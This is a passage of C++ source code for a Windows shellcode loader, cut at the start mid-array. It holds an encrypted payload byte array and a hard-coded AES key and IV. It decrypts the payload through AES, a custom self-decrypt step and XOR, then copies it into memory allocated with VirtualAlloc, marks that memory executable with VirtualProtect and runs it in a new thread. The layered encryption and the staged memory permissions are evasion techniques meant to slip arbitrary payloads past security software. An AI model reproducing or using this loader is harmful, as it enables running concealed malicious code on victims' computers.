0x55, 0xC2, 0xE9, 0x8D, 0x7D, 0x61, 0x25, 0xE8, 0x49, 0x20, 0xFF, 0xB4, 0x58, 0x5C, 0x68, 0x0F, 0x99, 0xC5, 0x30, 0x57, 0x2F, 0x69, 0x0D, 0x09, 0xF7, 0xDF, 0x99, 0x90, 0xAC, 0x83, 0x82, 0x1A, 0x66, 0x1F, 0x08, 0x29, 0xDB, 0x7C, 0x8C, 0xCB, 0x5B, 0x68, 0x15, 0x1F, 0x59, 0x17, 0xBF, 0xAE, 0x17, 0xF8, 0x9B, 0x7B, 0x3D, 0x03, 0x9B, 0x3F, 0xB9, 0xCC, 0x7E, 0xEE, 0x34, 0xDA, 0x13, 0x1D, 0xDA, 0xF8, 0x68, 0xA4, 0x1B, 0xE7, 0x92, 0xCC, 0x64 };
    size_t shellcodeLength = sizeof(encryptedShellcode);

    // Allocate memory for decrypted shellcode
    BYTE* decryptedShellcode_step1 = new BYTE[shellcodeLength];
    BYTE* decryptedShellcode_step2 = new BYTE[shellcodeLength];
    BYTE* decryptedShellcode = new BYTE[shellcodeLength];


    // Decrypt the XOR加密过的shellcode
    //DecryptShellcode(encryptedShellcode, decryptedShellcode, shellcodeLength);

    //Decrypt Aes加密过的shellcode
    unsigned char AESkey[32] = { 0x96, 0x99, 0xA8, 0xCE, 0x5F, 0x5B, 0xC4, 0xF8, 0x38, 0x54, 0x56, 0xFD, 0x25, 0x5B, 0xA6, 0x8E, 0xC4, 0x0A, 0x87, 0x12, 0xF8, 0x88, 0x5C, 0xDC, 0x82, 0xB7, 0x39, 0x2C, 0x9D, 0xB3, 0x81, 0xC0 };

    unsigned char AESiv[16] = { 0xDD, 0xEA, 0x88, 0xB1, 0xA4, 0xCA, 0x81, 0xB9, 0xAE, 0x35, 0x30, 0x33, 0xD6, 0x58, 0x60, 0xAE };

    //AES_Decrypt(encryptedShellcode, shellcodeLength, AESkey, AESiv, decryptedShellcode);
    //SelfDecrypt(BYTE * encryptedShellcode, BYTE * decryptedShellcode, size_t length, BYTE key = 0xBB)

    //AES_Decrypt(encryptedShellcode, shellcodeLength, AESkey, AESiv, decryptedShellcode_step1);
    //XOR_Decrypt(decryptedShellcode_step1, decryptedShellcode, shellcodeLength);


    AES_Decrypt(encryptedShellcode,shellcodeLength, AESkey, AESiv, decryptedShellcode_step1);
    SelfDecrypt(decryptedShellcode_step1, decryptedShellcode_step2, shellcodeLength);
    XOR_Decrypt(decryptedShellcode_step2, decryptedShellcode, shellcodeLength);





    // Allocate memory for the shellcode in the process's address space (PAGE_READWRITE initially)
    LPVOID addr = VirtualAlloc(NULL, shellcodeLength, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (addr == NULL) {
        cout << "VirtualAlloc failed!" << endl;
        delete[] decryptedShellcode;
        return -1;
    }

    // Copy decrypted shellcode to allocated memory
    memcpy(addr, decryptedShellcode, shellcodeLength);

    // Change the memory protection to PAGE_EXECUTE (allow execution)
    DWORD oldProtect;
    if (!VirtualProtect(addr, shellcodeLength, PAGE_EXECUTE, &oldProtect)) {
        cout << "VirtualProtect failed!" << endl;
        VirtualFree(addr, 0, MEM_RELEASE);
        delete[] decryptedShellcode;
        return -1;
    }

    // Create a thread to execute the shellcode
    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)addr, NULL, 0, NULL);
    if (hThread == NULL) {
        cout << "CreateThread failed!" << endl;
        VirtualFree(addr, 0, MEM_RELEASE);
        delete[] decryptedShellcode;
        return -1;
    }

    // Wait for the thread to finish
    WaitForSingleObject(hThread, INFINITE);

    // Clean up
    CloseHandle(hThread);
    VirtualFree(addr, 0, MEM_RELEASE);
    delete[] decryptedShellcode;
    return 0;
}